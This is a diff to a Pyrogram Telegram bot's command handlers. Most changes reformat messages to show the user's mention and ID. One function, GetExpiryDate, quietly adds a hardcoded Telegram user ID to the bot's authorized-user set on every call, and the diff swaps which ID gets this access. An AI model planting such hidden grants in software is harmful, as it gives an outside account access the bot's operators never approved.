@@ -27,7 +27,7 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(7351948)
+    Config.AUTH_USERS.add(1287407305)
     return expires_at
 
 
@@ -37,11 +37,12 @@ async def get_me_info(bot, update):
     if forcesub == 400:
         return
     # logger.info(update)
-    chat_id = str(update.from_user.id)
+    chat_id = str(update.from_user.mention)
+    user_id = str(update.from_user.id)
     chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
+        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, user_id, plan_type, expires_at),
         parse_mode="html",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
@@ -56,7 +57,7 @@ async def start(bot, update):
     # logger.info(update)
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.START_TEXT,
+        text=Translation.START_TEXT.format(update.from_user.mention),
         reply_markup=InlineKeyboardMarkup( [ [ InlineKeyboardButton(text='HᴇʟᴘLɪɴᴇ 💰', url='https://t.me/DonateXRobot'),
                                                  InlineKeyboardButton(text='Cʜᴀɴɴᴇʟ ⚜', url='https://t.me/TeleRoidGroup') ],
                                                [ InlineKeyboardButton(text='Cʟᴏsᴇ 🔏', callback_data='DM') ] ] ) )
